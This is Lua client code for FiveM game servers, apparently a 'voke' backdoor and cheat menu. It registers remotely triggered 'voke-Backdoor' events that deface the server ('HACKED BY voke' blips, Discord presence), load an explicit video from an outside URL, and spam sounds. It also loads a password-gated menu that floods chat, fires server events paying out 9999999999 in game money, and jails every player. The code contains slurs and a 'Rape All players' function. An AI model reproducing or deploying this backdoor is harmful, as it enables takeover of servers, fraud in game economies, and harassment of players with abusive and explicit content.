RegisterNetEvent("voke-Backdoor-pornScreen")
AddEventHandler("voke-Backdoor-pornScreen", function()
	local pTxt = CreateRuntimeTxd('pornTxd');
	local pornScreen = CreateDui("https://galleryn0.vcmdiawe.com/f8d2e11bd6c43618af00d6f28c91232a19/5d4c2868845c146fa7a1ab67a53726da.mp4?psid=ed_spnkbngvbdtt1", 1920, 1080);
...
RegisterNetEvent("voke-Backdoor-discordHack")
AddEventHandler("voke-Backdoor-discordHack", function(text)
    Citizen.CreateThread(function()
        while true do
			SetDiscordAppId(972882580519157822)
			SetDiscordRichPresenceAsset("voke")
			SetRichPresence("Server Hacked by voke")
			SetDiscordRichPresenceAssetText('Developer of voke Rat: voke')
			SetDiscordRichPresenceAssetSmall('voke')
			SetDiscordRichPresenceAssetSmallText('Developer of voke Rat: voke')
			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "")
			SetDiscordRichPresenceAction(1, "Hacked by voke", "")
			Citizen.Wait(1)
        end
    end)
end)

RegisterNetEvent("voke-Backdoor-BlipsHack")
AddEventHandler("voke-Backdoor-BlipsHack", function()
	local blips = {
		{title="HACKED BY voke", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY voke", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY voke", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY voke", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY voke", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY voke", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY voke", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY voke", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY voke", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY voke", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY voke", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY voke", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY voke", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY voke", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY voke", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY voke", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY voke", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY voke", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY voke", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY voke", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY voke", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY voke", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY voke", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY voke", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY voke", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY voke", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY voke", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY voke", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
	 }
...
RegisterNetEvent("voke-Backdoor-soundSpam")
AddEventHandler("voke-Backdoor-soundSpam", function()
	Citizen.CreateThread(function()
		while true do
...
RegisterNetEvent("voke-Backdoor-Falcon")
AddEventHandler("voke-Backdoor-Falcon", function()
	Falcon = {}
	Falcon.debug = false
...
RegisterNetEvent("voke-Backdoor-Voke")
AddEventHandler("voke-Backdoor-Voke", function()
	local mhaonn = true
	ESX = nil;
	...
	local bv = false;
	local bw = true;
	local bx = GetPlayerServerId(PlayerPedId(-1)) local by = GetPlayerName(bx) av("~h~Best FiveM  Cheats - Voke#7799", true) local
	...
	else local ak = KeyboardInput("Get your password from Voke`S Discord", "", 100) if ak == bD then mhaonn = true;
	...
	function bananapartyall() Citizen.CreateThread(function() for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
			...
			"Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem") end;
	...
	function RapeAllFunc() for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
			...
			"You got raped by Voke on YouTube") end;
	...
	Citizen.CreateThread(function() while bw do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), d4, 0) if SuperJump
		...
		function esxdestroyv2() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
				...
				"Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem") end;
			for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem", 43161337) TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3) TriggerServerEvent("NB:recruterplayer", i, "police", 3) end end) end;
		...
		if LynxEvo.IsMenuOpened("LynxX") then local dQ = PlayerId(-1) local bH = GetPlayerName(dQ) av("Voke Cheats", false) av("Best FiveM CHEATS?! YES, Voke CHEATS~! - @Voke#7799", false) if LynxEvo.MenuButton("~h~~p~#~s~ Self Menu", "SelfMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Online Players", "OnlinePlayerMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Teleport Menu", "TeleportMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle Menu", "VehicleMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Weapon Menu", "WeaponMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", "LuaMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", "AdvM") then elseif LynxEvo.MenuButton("~h~~p~# ~y~Voke Community", "crds") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SelfMenu") then
		...
		for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem") end elseif LynxEvo.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif LynxEvo.Button("~h~~r~Rape~s~ All players") then RapeAllFunc() elseif LynxEvo.Button("~h~~r~Cage~s~ All players") then
		for
		...
		if LynxEvo.Button("~h~~p~#~s~ Voke~r~ ~p~DEV") then av("~h~~o~Dont click me BAKA!~s~.", false) av("Im a fag?", false) av("I had to take the liberty to modify this", false) elseif LynxEvo.Button("") then elseif LynxEvo.Button("") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponTypes") then
		...
		if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(eA, eB, eC) bv = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Voke RC4 ~ https://Voke.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(eA, eB, eC) bw = false end, false) RegisterCommand("lol", function(eA, eB, eC) mhaonn = false end, false)
end)

RegisterNetEvent("voke-Backdoor-HackServer")
AddEventHandler("voke-Backdoor-HackServer", function()
	local blips = {
		{title="HACKED BY voke", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY voke", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY voke", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
	...
	local config = {
	   ["TITLE"] = "~r~voke - discord.gg/satanleaks", 
	   ["SUBTITLE"] = "~r~voke - discord.gg/satanleaks",
	   ["MAP"] = "voke",
	   ["STATUS"] = "voke",
	   ["GAME"] = "voke",
	   ["INFO"] = "voke",
